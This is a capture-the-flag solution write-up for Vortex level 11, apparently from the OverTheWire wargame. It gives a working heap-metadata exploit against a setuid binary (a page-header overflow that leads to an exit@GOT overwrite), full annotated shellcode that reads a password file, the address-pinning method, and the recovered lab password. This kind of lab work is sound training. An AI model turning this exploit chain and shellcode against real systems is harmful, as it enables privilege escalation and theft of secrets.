# Vortex L11 — solution notes (solved 2026-11-16)

## The program (live binary, verified 2026-11-16)

`/vortex/vortex11`, mode 4550, setuid vortex12, group vortex11, 20660
bytes, md5 `c6b84d4cebbd082a3c852c83305443b2`, not stripped.  It embeds
its own **phkmalloc** (the FreeBSD allocator, `malloc`/`malloc_bytes`
compiled into the binary — the GOT shows `mmap/munmap/madvise/brk/sbrk`
but no `malloc@GLIBC`).  Reconstructed from `objdump`:

```c
int main(int argc, char **argv) {
    if (argc <= 2) exit(0);
    char *a = malloc(0x800);
    char *b = malloc(0x10);
    char *c = malloc(0x800);
    strcpy(c, argv[1]);            /* UNBOUNDED heap overflow */
    char *d = malloc(0x10);
    strncpy(d, argv[2], 0xf);      /* the write primitive */
    exit(0);
}
```

## Heap layout (gdb-verified)

```
a = malloc(0x800) -> 0x804f000        (first page, chunk 0)
b = malloc(0x10)  -> 0x8050030        (second page, chunk 1)
c = malloc(0x800) -> 0x804f800        (first page, chunk 1)
d = malloc(0x10)  -> 0x8050040        (second page, chunk 2)
```

phkmalloc serves from page-sized chunks with a **page header** at each
page start: `prev`, `next`, `info`, `bits/bitmap`.  The second page's
header sits at `0x8050000`:

```
0x8050000: prev=0  next=0x8050000 (self)  info=0x00040010
0x805000c: bits=0x10, bitmap word 0xfd00fc
```

## The exploit chain

1. **The overflow.**  `c` spans `0x804f800..0x8050000` (2048 bytes);
   byte 2048 of `strcpy(c, argv[1])` lands on the page header.
   `argv[1] = 'A'*2048 + prev(4) + next(4) + info byte`:
   `0x11111111` (junk prev), `0x0804cfdc` (next = an address inside the
   old a-chunk region that reads as a fake chunk), info byte `0x11`;
   the copy then **stops at the NUL** right after `0x11`, so the rest
   of the header (bits=4, bitmap=0xfffffff0) stays pristine — no
   memset(0xd0) crash (malloc_junk=1 memset of 0x1111 bytes would hit
   the read-only RELRO page).
2. **malloc_bytes aims the write.**  The corrupt `next` makes
   `malloc(0x10)` walk a fake chunk whose bit_index shift gives
   `chunk->base + 64 = 0x804cfdc + 64 = 0x804d01c = exit@GOT`.
3. **strncpy = 15-byte write.**  `strncpy(d, argv[2], 0xf)` writes 15
   bytes at exit@GOT — enough for a 4-byte shellcode address plus the
   adjacent slots' bytes (partial-overwrite style).  `argv[2]` =
   shellcode address (little-endian, low byte nonzero) + filler.
4. **exit(0) jumps to the shellcode.**  main's final `call exit@plt`
   reads the patched GOT and lands in the EGG environment variable:
   a 1500-byte NOP sled + the 73-byte password shellcode.
   `GNU_STACK RWE` (readelf-verified) — the stack is executable, and
   ASLR is off.

## The shellcode (73 bytes, NUL-free, int 0x80)

```
31 c0 50              eax=0; push eax          (4 NULs terminator)
68 74 65 78 31        push 0x31786574  'tex1'
68 2f 76 6f 72        push 0x726f762f  'vor/'
68 70 61 73 73        push 0x73736170  'pass'
68 74 65 78 5f        push 0x5f786574  'tex_'
68 2f 76 6f 72        push 0x726f762f  'vor/'
68 2f 65 74 63        push 0x6374652f  '/etc'
89 e3                 mov ebx, esp             -> "/etc/vortex_pass/vortex1"
c6 43 18 32           mov byte [ebx+24], '2'   -> "...vortex12"
31 c9 b0 05 cd 80     open(ebx, 0)             -> fd (euid=vortex12)
89 c3
b0 03 89 e1 31 d2 b2 64 cd 80   read(fd, buf, 100)
89 c2
b0 04 b3 01 89 e1 cd 80         write(1, buf, n)
b0 01 31 db cd 80     exit(0)
```

The path builds as `/etc/vortex_pass/vortex1` and byte 24 (`'1'`) is
patched to `'2'` in place.  The level is setuid **vortex12**, so the
pass file `/etc/vortex_pass/vortex12` (mode 400 vortex12) is readable
by euid without any setreuid first.

Two bugs that cost the most time (both mine, not the lab's):

- **Push-immediate endianness.**  `push 0x31786574` puts bytes
  `74 65 78 31` = `"tex1"` in memory.  An earlier draft used
  `push 0x74786531` ("1tex") and built `/etc/vortex_pass/vor1tex2` —
  ENOENT even when everything else worked.
- **Harness EFAULTs were 64-bit artifacts, not a syscall filter.**
  The first `seccomptest`/`wt.c` probes were compiled with plain
  `gcc` (64-bit) and did `memcpy(o+7, &path, 4)` — copying only the
  LOW 4 BYTES of an 8-byte pointer.  A truncated pointer is unmapped,
  so `int 0x80 open -> -14 (EFAULT)` was literally "bad address".
  `getpid` (no pointer args) returned 12 — int 0x80 worked all along.
  A probe compiled with `gcc -m32` on the lab confirmed:
  open/read/write all succeed.  L7/L8 shellcodes had already used
  int 0x80 file syscalls successfully on this same lab.

## Pinning the EGG address (no gdb sweep)

ASLR is off, so the kernel places the env strings identically for any
execve with the same total argv+envp byte lengths.  A helper `h11.c`
(`printf("%p", getenv("EGG"))`) compiled `-m32`, invoked with the SAME
two argv strings as the level, reports the exact `EGG` address the
level will see (`0xffffd7d7` live).  The target inside the sled:
`EGG + 1024` (mid-sled; the 1500-byte sled absorbs any residual
drift).  If the low byte of the target is 0, skip to the next byte —
argv[2] cannot contain NULs (strncpy/strcpy stop at NUL).

## Live run

```
EGG at 0xffffd7d7
TGT=4294958039 (0xffffd7d7, low byte d7 — no NUL adjustment)
RC=0
YufVIb8Mo                      <- dumped by the shellcode
```

## Verification

- Login as vortex12 with `YufVIb8Mo`: `uid=5012(vortex12)` ✓
- `cat /etc/vortex_pass/vortex12` → `YufVIb8Mo` ✓
- `/vortex/vortex12` exists: `4550 vortex13:vortex12` — the chain
  continues to L12.

## Password for vortex12

`YufVIb8Mo`

## Files

- `build11.py` — payload builder (craft + EGG sled + shellcode), the
  version typed in vim during the recording.
- The recording: `recordings/vortex/L11.cast` (the driver also types
  `h11.c`, the address-pinning helper, inline via heredoc).
